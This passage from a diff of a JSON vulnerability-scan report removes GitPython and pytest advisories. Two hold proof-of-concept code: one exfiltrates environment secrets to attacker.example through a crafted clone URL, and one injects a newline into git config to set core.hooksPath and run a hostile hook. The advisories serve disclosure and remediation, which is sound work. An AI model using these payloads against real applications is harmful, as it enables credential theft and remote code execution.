Git.check_unsafe_options(options=list(kwargs.keys()), unsafe_options=cls.unsafe_git_clone_options)\nif not allow_unsafe_options and multi:\n    Git.check_unsafe_options(options=multi, unsafe_options=cls.unsafe_git_clone_options)\n\nproc = git.clone(\n    multi,\n    \"--\",\n    Git.polish_url(url),          # <-- line 1417: expanded URL sent to `git clone`\n    clone_path,\n    ...\n)\n```\n\nBecause `os.path.expandvars()` on POSIX substitutes `$NAME` and `${NAME}` with `os.environ[NAME]` when set (and on Windows additionally `%NAME%`), an attacker-supplied URL such as:\n\n```\nhttps://attacker.example/steal/${AWS_SECRET_ACCESS_KEY}/repo.git\n```\n\nis rewritten server-side to embed the literal secret value in the path component, and `git clone` then issues an HTTP(S) request (and DNS lookup, if the token is placed in the host label) carrying that value to `attacker.example`. The clone itself will typically fail, but the secret has already left the server by that point.\n\n`polish_url()` was written as a local-path normalisation helper (Cygwin path conversion, `~` expansion, backslash fixing) and is applied indiscriminately to remote URLs. There is no scheme check, no `expand_vars=False` opt-out for the clone URL, and no documentation that the URL undergoes environment expansion — the `clone_from` docstring describes `url` only as a \"Valid git url\". By contrast, the maintainers already flag env-var expansion as a security concern for the *local repository path* argument: `Repo.__init__` emits a deprecation warning (\"The use of environment variables in paths is deprecated for security reasons\", `git/repo/base.py:226–231`) and offers `expand_vars=False`. The same treatment is missing for the network-bound clone URL.\n\n**Secondary consequence (unsafe-protocol filter bypass).** Because `check_unsafe_protocols()` runs on the *pre-expansion* URL (line 1408) but the *post-expansion* URL is what reaches `git`, an attacker who additionally controls any environment variable in the server process could set e.g. `X=ext::sh -c '...'` and submit `url=\"$X\"`; the raw string `$X` passes the `ext::` filter, then expands to an `ext::` remote-helper transport that `git` will execute. This requires a second precondition (env-var write) and is noted as an aggravating factor rather than a separate vulnerability.\n\n### PoC\nTested against `gitpython==3.1.50` on Linux with Python 3 and `git` on `PATH`.\n\n```bash\npython3 -m venv /tmp/gp-venv\n/tmp/gp-venv/bin/pip install gitpython==3.1.50\n/tmp/gp-venv/bin/python poc.py\n```\n\n`poc.py`:\n```python\n#!/usr/bin/env python3\n\"\"\"\nPoC: environment-variable exfiltration via Repo.clone_from() URL.\n\nDemonstrates that an attacker-controlled `url` argument to Repo.clone_from()\nis passed through os.path.expandvars() before being given to `git clone`,\nso `$NAME` tokens in the URL are replaced with the server process's\nenvironment-variable values and transmitted to the attacker-named host.\n\nThe PoC intercepts the Popen argv to show the exact URL handed to `git`\nwithout performing real network I/O.\n\"\"\"\nimport os\nimport sys\nimport subprocess\nimport tempfile\n\n# Simulate a sensitive server-side environment variable.\nos.environ[\"AWS_SECRET_ACCESS_KEY\"] = \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\"\n\nimport git                              # noqa: E402\nfrom git import Git, Repo               # noqa: E402\n\nprint(f\"gitpython version: {git.__version__}\")\n\n# --- Layer 1: Git.polish_url() directly --------------------------------------\nattacker_url = \"https://attacker.example/steal/$AWS_SECRET_ACCESS_KEY/repo.git\"\npolished = Git.polish_url(attacker_url)\nprint(\"\\n[Layer 1] polish_url result:\")\nprint(f\"  input : {attacker_url}\")\nprint(f\"  output: {polished}\")\nif os.environ[\"AWS_SECRET_ACCESS_KEY\"] in polished:\n    print(\"  -> secret SUBSTITUTED into URL by polish_url()\")\n\n# --- Layer 2: full Repo.clone_from() -- capture argv given to `git` ----------\ncaptured = {}\norig_popen = subprocess.Popen\n\nclass CapturingPopen(orig_popen):\n    def __init__(self, cmd, *a, **kw):\n        if isinstance(cmd, (list, tuple)) and \"clone\" in cmd:\n            captured[\"cmd\"] = list(cmd)\n        super().__init__(cmd, *a, **kw)\n\nsubprocess.Popen = CapturingPopen\nimport git.cmd as gitcmd                # noqa: E402\ngitcmd.safer_popen = CapturingPopen     # non-Windows: safer_popen == Popen\n\ndest = tempfile.mkdtemp(prefix=\"gp_poc_\")\ntry:\n    Repo.clone_from(attacker_url, os.path.join(dest, \"out\"))\nexcept Exception as e:\n    # The clone fails (attacker.example does not resolve); we only need argv.\n    print(f\"\\n[Layer 2] clone_from raised (expected): {type(e).__name__}\")\n\nsubprocess.Popen = orig_popen\n\nprint(\"\\n[Layer 2] argv passed to `git clone` subprocess:\")\nfor tok in captured.get(\"cmd\", []):\n    print(f\"  {tok}\")\n\ncmd = captured.get(\"cmd\", [])\nurl_arg = cmd[cmd.index(\"--\") + 1] if \"--\" in cmd else None\nprint(f\"\\n[Layer 2] URL argument given to git: {url_arg}\")\n\nsecret = os.environ[\"AWS_SECRET_ACCESS_KEY\"]\nif url_arg and secret in url_arg:\n    print(\n        \"\\nVULNERABLE: server env var AWS_SECRET_ACCESS_KEY was interpolated \"\n        \"into the remote clone URL; git would transmit it to attacker.example.\"\n    )\n    sys.exit(0)\nprint(\"\\nNOT VULNERABLE\")\nsys.exit(1)\n```\n\nExpected output:\n```\ngitpython version: 3.1.50\n\n[Layer 1] polish_url result:\n  input : https://attacker.example/steal/$AWS_SECRET_ACCESS_KEY/repo.git\n  output: https://attacker.example/steal/wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY/repo.git\n  -> secret SUBSTITUTED into URL by polish_url()\n\n[Layer 2] clone_from raised (expected): GitCommandError\n\n[Layer 2] argv passed to `git clone` subprocess:\n  git\n  clone\n  -v\n  --\n  https://attacker.example/steal/wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY/repo.git\n  /tmp/gp_poc_XXXXXXXX/out\n\n[Layer 2] URL argument given to git: https://attacker.example/steal/wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY/repo.git\n\nVULNERABLE: server env var AWS_SECRET_ACCESS_KEY was interpolated into the remote clone URL; git would transmit it to attacker.example.\n```\n\nThe captured argv is the exact command line spawned by GitPython; against a real attacker-controlled host, `git` would issue a DNS lookup and HTTP(S) request to that host with the secret embedded in the request path.\n\n### Impact\nAny application that calls `Repo.clone_from()` (or `Repo.clone()`) with a URL that is wholly or partially attacker-controlled — the canonical pattern for \"import/mirror repository from URL\" features in CI systems, source-code hosting platforms, dependency scanners, and build pipelines — allows an unauthenticated or low-privileged attacker to exfiltrate arbitrary environment variables from the server process, one per request, by naming them in the URL. Cloud credentials, API tokens, and signing keys stored in the environment are the primary targets. Applications that do not accept clone URLs from untrusted sources, or that run the cloner in a process with a fully stripped environment, are not affected. There is no direct integrity or availability impact.\n\n**Suggested fix:** Remove the `os.path.expandvars()` (and `os.path.expanduser()`) call from `Git.polish_url()` for inputs that are remote URLs (contain `://` or match `user@host:path`), or remove the expansion entirely and require callers who want local-path env expansion to perform it themselves — mirroring the existing deprecation on `Repo(path, expand_vars=…)`. Additionally, apply `check_unsafe_protocols()` to the *post-transformation* URL so no future `polish_url` change can silently bypass the `ext::` filter.",
-        "fixedVersion": "3.1.52",
-        "affectedRange": ">=0,<3.1.52",
-        "isFixAvailable": true,
-        "exploitedInWild": null,
-        "epssScore": null,
-        "published": "2026-07-21T22:06:09Z",
-        "modified": "2026-08-02T03:56:46.931996040Z",
-        "references": [
-          "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-rwj8-pgh3-r573",
-          "https://github.com/gitpython-developers/GitPython/pull/2172",
-          "https://github.com/gitpython-developers/GitPython/commit/8ac5a30519b6f4af85398b9b9d7064ff4d452da2",
-          "https://github.com/gitpython-developers/GitPython",
-          "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.52"
-        ]
-      },
-      {
-        "name": "gitpython",
-        "ecosystem": "PyPI",
-        "version": "3.1.40",
-        "direct": false,
-        "dependencyType": "unknown",
-        "purl": "pkg:pypi/gitpython@3.1.40",
-        "cveIds": [
-          "CVE-2026-44244"
-        ],
-        "aliases": [
-          "GHSA-v87r-6q3f-2j67",
-          "PYSEC-2026-2163"
-        ],
-        "cweIds": [
-          "CWE-94"
-        ],
-        "severity": "HIGH",
-        "cvssScore": 7.8,
-        "summary": "GitPython: Newline injection in config_writer().set_value() enables RCE via core.hooksPath",
-        "details": "`GitConfigParser.set_value()` passes values to Python's `configparser` without validating for newlines. GitPython's own `_write()` converts embedded newlines into indented continuation lines (e.g. `\\n` becomes `\\n\\t`), but Git still accepts an indented `[core]` stanza as a section header — so the injected `core.hooksPath` becomes effective configuration. Any Git operation that invokes hooks (commit, merge, checkout) will then execute scripts from the attacker-controlled path.\n\nThe vulnerability is not merely malformed config output: GitPython's own writer converts embedded newlines into indented continuation lines, but Git still accepts an indented `[core]` stanza as a section header, so the injected `core.hooksPath` becomes effective configuration.\n\nThis was found while auditing MLRun's `project.push()` method, which passes `author_name` and `author_email` directly to `config_writer().set_value()` with no sanitization. Both parameters cross a trust boundary — they are caller-supplied API inputs that end up in `.git/config`.\n\nPoC (standalone, no MLRun required):\n\n```python\nimport git, subprocess, os\n\nrepo = git.Repo(\"/tmp/testrepo\")\n\nwith repo.config_writer() as cw:\n    cw.set_value(\"user\", \"name\", \"foo\\n[core]\\nhooksPath=/tmp/hooks\")\n\nr = subprocess.run([\"git\", \"config\", \"core.hooksPath\"], cwd=\"/tmp/testrepo\", capture_output=True, text=True)\nassert r.returncode == 0\nprint(r.stdout.strip())  # /tmp/hooks\n\nos.makedirs(\"/tmp/hooks\", exist_ok=True)\nopen(\"/tmp/hooks/pre-commit\", \"w\").write(\"#!/bin/sh\\nid > /tmp/pwned\\n\")\nos.chmod(\"/tmp/hooks/pre-commit\", 0o755)\n\nrepo.index.add([\"README\"])\nrepo.git.commit(m=\"test\")\nprint(open(\"/tmp/pwned\").read())  # uid=...\n```\n\nTested on GitPython 3.1.46, git 2.39+.\n\nImpact: This is persistent repo config poisoning. Any user who can supply `author_name` or `author_email` to an application calling `config_writer().set_value()` can redirect Git hook execution to an arbitrary path. In a multi-user or hosted environment (e.g. a shared MLRun server where multiple users push to the same repositories), one user can poison the `.git/config` of a shared repo and have their hooks run in the context of every subsequent Git operation by any user. On single-user deployments, the impact depends on whether the application later invokes Git hooks automatically.\n\nRemediation: `set_value()` should raise on CR, LF, or NUL in values rather than silently pass them through:\n\n```python\nimport re\n\nif isinstance(value, (str, bytes)) and re.search(r\"[\\r\\n\\x00]\", str(value)):\n    raise ValueError(\"Git config values must not contain CR, LF, or NUL\")\n```\n\nRejecting is safer than stripping — a stripped newline might indicate the caller is passing unsanitized input at a higher level, and silent normalization masks that.\n\nAffected wherever `config_writer().set_value(section, key, user_input)` is called with external input.** GitPython is a dependency of DVC, MLflow, Kedro, and others — worth auditing their `set_value()` call sites for externally influenced inputs.",
-        "fixedVersion": "3.1.49",
-        "affectedRange": ">=0,<3.1.49",
-        "isFixAvailable": true,
-        "exploitedInWild": null,
-        "epssScore": null,
-        "published": "2026-05-06T21:58:00Z",
-        "modified": "2026-07-13T07:26:38.585123077Z",
-        "references": [
-          "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-v87r-6q3f-2j67",
-          "https://nvd.nist.gov/vuln/detail/CVE-2026-44244",
-          "https://github.com/gitpython-developers/GitPython",
-          "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.49"
-        ]
-      },
-      {
-        "name": "gitpython",
-        "ecosystem": "PyPI",
-        "version": "3.1.40",
-        "direct": false,
-        "dependencyType": "unknown",
-        "purl": "pkg:pypi/gitpython@3.1.40",
-        "cveIds": [
-          "CVE-2026-42284"
-        ],
-        "aliases": [
-          "PYSEC-2026-2161",
-          "GHSA-x2qx-6953-8485"
-        ],
-        "cweIds": [],
-        "severity": "CRITICAL",
-        "cvssScore": 9.8,
-        "summary": "",
-        "details": "GitPython is a python library used to interact with Git repositories. Prior to version 3.1.47, _clone() validates multi_options as the original list, then executes shlex.split(\" \".join(multi_options)). A string like \"--branch main --config core.hooksPath=/x\" passes validation (starts with --branch), but after split becomes [\"--branch\", \"main\", \"--config\", \"core.hooksPath=/x\"]. Git applies the config and executes attacker hooks during clone. This issue has been patched in version 3.1.47.",
-        "fixedVersion": "3.1.47",
-        "affectedRange": ">=0,<3.1.47",
-        "isFixAvailable": true,
-        "exploitedInWild": null,
-        "epssScore": null,
-        "published": "2026-05-07T19:16:01.783Z",
-        "modified": "2026-07-13T07:15:21.469164335Z",
-        "references": [
-          "https://www.tenable.com/cve/CVE-2026-32686",
-          "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.47",
-          "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-x2qx-6953-8485"
-        ]
-      },
-      {
-        "name": "pytest",
-        "ecosystem": "PyPI",
-        "version": "8.3.4",
-        "direct": false,
-        "dependencyType": "unknown",
-        "purl": "pkg:pypi/pytest@8.3.4",
-        "cveIds": [
-          "CVE-2025-71176"
-        ],
-        "aliases": [
-          "GHSA-6w46-j5rx-g56g",
-          "PYSEC-2026-1845"
-        ],
-        "cweIds": [
-          "CWE-379"
-        ],
-        "severity": "MEDIUM",
-        "cvssScore": 6.8,
-        "summary": "pytest has vulnerable tmpdir handling",
-        "details": "pytest through 9.0.2 on UNIX relies on directories with the `/tmp/pytest-of-{user}` name pattern, which allows local users to cause a denial of service or possibly gain privileges.",
-        "fixedVersion": "9.0.3",
-        "affectedRange": ">=0,<9.0.3",
-        "isFixAvailable": true,
-        "exploitedInWild": null,
-        "epssScore": null,
-        "published": "2026-01-22T06:30:29Z",
-        "modified": "2026-07-07T17:56:26.471696626Z",
-        "references": [
-          "https://nvd.nist.gov/vuln/detail/CVE-2025-71176",
-          "https://github.com/pytest-dev/pytest/issues/13669",
-          "https://github.com/pytest-dev/pytest/pull/14343",
-          "https://github.com/pytest-dev/pytest/commit/95d8423bd24992deea5b9df32555fa1741679e2c",
-          "https://github.com/pytest-dev/pytes",
-          "https://github.com/pytest-dev/pytest/releases/tag/9.0.3",
-          "https://www.openwall.com/lists/oss-security/2026/01/21/5"
-        ]
-      }
-    ],
+    "linesOfCode": 183,
+    "testFiles": 0,
+    "dependenciesWithCves": [],
+    "dependencyVulnerabilities": [],
     "vulnerabilitiesBySeverity": {
-      "HIGH": 4
+      "HIGH": 2
     }
   }
 }
